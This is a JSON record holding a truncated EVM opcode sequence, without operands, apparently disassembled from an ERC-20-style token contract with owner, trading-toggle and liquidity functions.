{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT SWAP1 DUP2 AND PUSH20 OR SWAP1 SWAP2 SSTORE PUSH1 DUP1 SLOAD SWAP1 SWAP2 AND PUSH2 OR SWAP1 SSTORE PUSH3 PUSH1 PUSH1 PUSH3 JUMP JUMPDEST PUSH3 SWAP1 PUSH4 PUSH3 JUMP JUMPDEST PUSH1 SSTORE PUSH1 PUSH1 SLOAD PUSH1 PUSH3 SWAP2 SWAP1 PUSH3 JUMP JUMPDEST PUSH3 SWAP2 SWAP1 PUSH3 JUMP JUMPDEST PUSH1 SSTORE PUSH3 PUSH1 SLOAD PUSH1 PUSH3 SWAP2 SWAP1 PUSH3 JUMP JUMPDEST PUSH3 SWAP2 SWAP1 PUSH3 JUMP JUMPDEST PUSH1 SSTORE PUSH2 PUSH1 SLOAD PUSH1 PUSH3 SWAP2 SWAP1 PUSH3 JUMP JUMPDEST PUSH3 SWAP2 SWAP1 PUSH3 JUMP JUMPDEST PUSH1 SSTORE PUSH1 DUP1 SLOAD PUSH3 PUSH1 SHL NOT AND SWAP1 SSTORE PUSH1 PUSH1 DUP2 SWAP1 SSTORE PUSH1 DUP2 SWAP1 SSTORE PUSH1 PUSH1 DUP2 SWAP1 SSTORE PUSH1 SSTORE PUSH1 DUP2 SWAP1 SSTORE PUSH1 SWAP1 SSTORE PUSH1 PUSH1 SSTORE CALLVALUE DUP1 ISZERO PUSH3 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 MLOAD PUSH3 CODESIZE SUB DUP1 PUSH3 DUP4 CODECOPY DUP2 ADD PUSH1 DUP2 SWAP1 MSTORE PUSH3 SWAP2 PUSH3 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT SWAP1 DUP2 AND CALLER SWAP1 DUP2 OR DUP4 SSTORE PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP7 DUP2 AND SWAP2 SWAP1 SWAP5 AND OR DUP2 SSTORE DUP2 DUP5 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP7 SHA3 DUP1 SLOAD PUSH1 NOT SWAP1 DUP2 AND PUSH1 SWAP1 DUP2 OR SWAP1 SWAP3 SSTORE DUP5 SLOAD DUP8 AND DUP9 MSTORE DUP3 DUP9 SHA3 DUP1 SLOAD DUP3 AND DUP4 OR SWAP1 SSTORE ADDRESS DUP1 DUP10 MSTORE DUP4 DUP10 SHA3 DUP1 SLOAD DUP4 AND DUP5 OR SWAP1 SSTORE DUP7 DUP10 MSTORE PUSH1 DUP6 MSTORE DUP4 DUP10 SHA3 DUP1 SLOAD DUP4 AND DUP5 OR SWAP1 SSTORE SWAP5 SLOAD SWAP1 SWAP7 AND DUP8 MSTORE DUP2 DUP8 SHA3 DUP1 SLOAD DUP8 AND DUP3 OR SWAP1 SSTORE SWAP3 DUP7 MSTORE DUP1 DUP7 SHA3 DUP1 SLOAD SWAP1 SWAP6 AND SWAP1 SWAP3 OR SWAP1 SWAP4 SSTORE PUSH1 SLOAD DUP3 DUP6 MSTORE PUSH1 DUP5 MSTORE DUP2 DUP6 SHA3 DUP2 SWAP1 SSTORE SWAP1 MLOAD SWAP1 DUP2 MSTORE SWAP1 SWAP3 DUP4 SWAP3 SWAP1 SWAP2 PUSH32 SWAP2 ADD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP PUSH3 JUMP JUMPDEST PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 DUP2 DUP2 JUMPDEST DUP1 DUP6 GT ISZERO PUSH3 JUMPI DUP2 PUSH1 NOT DIV DUP3 GT ISZERO PUSH3 JUMPI PUSH3 PUSH3 JUMP JUMPDEST DUP1 DUP6 AND ISZERO PUSH3 JUMPI SWAP2 DUP2 MUL SWAP2 JUMPDEST SWAP4 DUP5 SHR SWAP4 SWAP1 DUP1 MUL SWAP1 PUSH3 JUMP JUMPDEST POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP3 PUSH3 JUMPI POP PUSH1 PUSH3 JUMP JUMPDEST DUP2 PUSH3 JUMPI POP PUSH1 PUSH3 JUMP JUMPDEST DUP2 PUSH1 DUP2 EQ PUSH3 JUMPI PUSH1 DUP2 EQ PUSH3 JUMPI PUSH3 JUMP JUMPDEST PUSH1 SWAP2 POP POP PUSH3 JUMP JUMPDEST PUSH1 DUP5 GT ISZERO PUSH3 JUMPI PUSH3 PUSH3 JUMP JUMPDEST POP POP PUSH1 DUP3 SHL PUSH3 JUMP JUMPDEST POP PUSH1 DUP4 LT PUSH2 DUP4 LT AND PUSH1 DUP5 LT PUSH1 DUP5 LT AND OR ISZERO PUSH3 JUMPI POP DUP2 DUP2 EXP PUSH3 JUMP JUMPDEST PUSH3 DUP4 DUP4 PUSH3 JUMP JUMPDEST DUP1 PUSH1 NOT DIV DUP3 GT ISZERO PUSH3 JUMPI PUSH3 PUSH3 JUMP JUMPDEST MUL SWAP1 POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH3 PUSH1 DUP5 AND DUP4 PUSH3 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH3 JUMPI PUSH3 PUSH3 JUMP JUMPDEST PUSH1 DUP3 PUSH3 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH3 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND DUP2 EQ PUSH3 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH2 DUP1 PUSH3 PUSH1 CODECOPY PUSH1 RETURN UNKNOWN_0xfe PUSH1 PUSH1 MSTORE PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 JUMPI STOP JUMPDEST PUSH1 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 DUP2 MSTORE PUSH14 PUSH1 SHL PUSH1 DUP3 ADD MSTORE JUMPDEST PUSH1 MLOAD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND DUP2 JUMP JUMPDEST PUSH1 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH1 MLOAD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 DUP3 AND SWAP2 AND EQ SWAP1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 MLOAD PUSH1 DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 MLOAD PUSH1 PUSH1 PUSH1 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD SWAP1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 DUP2 MSTORE PUSH6 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 CALLDATASIZE PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP2 DUP3 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE SHA3 SLOAD SWAP1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH1 SLOAD PUSH2 SWAP1 PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 JUMP JUMPDEST CALLER PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 PUSH1 PUSH1 PUSH1 SHL SUB DUP8 AND DUP1 DUP6 MSTORE SWAP3 MSTORE DUP1 DUP4 SHA3 DUP6 SWAP1 SSTORE MLOAD SWAP2 SWAP3 SWAP1 SWAP2 PUSH32 SWAP1 PUSH2 SWAP1 DUP7 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP PUSH1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 SHA3 SLOAD PUSH1 NOT EQ PUSH2 JUMPI PUSH1 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 DUP2 MSTORE PUSH22 PUSH1 SHL PUSH1 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 PUSH1 PUSH1 SHL SUB DUP8 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP3 MSTORE DUP4 DUP2 SHA3 CALLER DUP3 MSTORE SWAP1 SWAP2 MSTORE SWAP2 SWAP1 SWAP2 SHA3 SLOAD PUSH2 SWAP2 DUP5 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP6 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 SHA3 SSTORE JUMPDEST PUSH2 DUP5 DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 SELFBALANCE GT PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH22 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 MLOAD CALLER SWAP1 SELFBALANCE DUP1 ISZERO PUSH2 MUL SWAP2 PUSH1 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT AND DUP2 SSTORE PUSH1 MLOAD SWAP1 DUP2 MSTORE PUSH32 SWAP1 PUSH1 ADD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST POP PUSH1 SLOAD PUSH1 SSTORE PUSH1 SWAP1 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH3 PUSH1 SHL NOT AND PUSH3 PUSH1 SHL OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND CALLER EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT AND PUSH20 SWAP1 DUP2 OR SWAP1 SWAP2 SSTORE PUSH1 DUP1 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE SWAP1 MLOAD PUSH4 SWAP2 PUSH1 DUP1 DUP3 ADD SWAP3 PUSH1 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH4 ADDRESS PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH4 PUSH1 MLOAD DUP2 PUSH4 AND PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT PUSH1 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 PUSH1 PUSH1 SHL SUB SWAP3 DUP4 AND PUSH1 DUP3 ADD MSTORE SWAP2 AND PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB NOT AND PUSH1 PUSH1 PUSH1 SHL SUB SWAP3 DUP4 AND SWAP1 DUP2 OR SWAP1 SWAP2 SSTORE PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 SWAP1 DUP2 MSTORE PUSH1 DUP1 DUP4 SHA3 DUP1 SLOAD PUSH1 NOT AND PUSH1 OR SWAP1 SSTORE ADDRESS DUP1 DUP5 MSTORE PUSH1 DUP4 MSTORE DUP2 DUP5 SHA3 PUSH1 DUP1 SLOAD DUP8 AND DUP7 MSTORE SWAP1 DUP5 MSTORE DUP3 DUP6 SHA3 PUSH1 NOT SWAP1 SSTORE SLOAD DUP2 DUP6 MSTORE PUSH1 SWAP1 SWAP4 MSTORE SWAP3 SHA3 SLOAD SWAP3 AND SWAP2 PUSH4 SWAP2 SELFBALANCE SWAP2 PUSH1 DUP1 SLOAD PUSH1 MLOAD PUSH1 DUP8 SWAP1 SHL PUSH1 PUSH1 PUSH1 SHL SUB NOT AND DUP2 MSTORE PUSH1 PUSH1 PUSH1 SHL SUB SWAP5 DUP6 AND PUSH1 DUP3 ADD MSTORE PUSH1 DUP2 ADD SWAP4 SWAP1 SWAP4 MSTORE PUSH1 DUP4 ADD DUP3 SWAP1 MSTORE PUSH1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE SWAP2 SWAP1 SWAP2 AND PUSH1 DUP3 ADD MSTORE TIMESTAMP PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 DUP2 DUP5 DUP5 GT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST POP PUSH1 PUSH2 DUP5 DUP7 PUSH2 JUMP JUMPDEST SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 PUSH1 SHL SUB DUP5 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP4 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH3 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 DUP3 GT PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH9 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 SWAP1 DUP2 SWAP1 PUSH1 AND ISZERO PUSH2 JUMPI PUSH2 DUP7 DUP7 DUP7 PUSH2 JUMP JUMPDEST SWAP3 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP7 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND ISZERO DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 SHL SUB DUP6 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH1 SLOAD PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH20 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND PUSH2 JUMPI PUSH2 DUP7 DUP7 DUP7 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP7 DUP2 AND SWAP2 AND EQ DUP1 ISZERO SWAP1 PUSH2 JUMPI POP PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP7 DUP2 AND SWAP2 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 SHL SUB DUP7 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 SHL SUB DUP6 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND ISZERO JUMPDEST ISZERO PUSH2 JUMPI PUSH1 PUSH1 PUSH1 SHL SUB DUP6 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND DUP1 PUSH2 JUMPI POP PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP7 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH2 SWAP1 DUP7 SWAP1 PUSH2 JUMP JUMPDEST GT ISZERO JUMPDEST PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH5 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB SWAP1 DUP2 AND SWAP1 DUP8 AND SUB PUSH2 JUMPI PUSH1 DUP1 SLOAD SWAP1 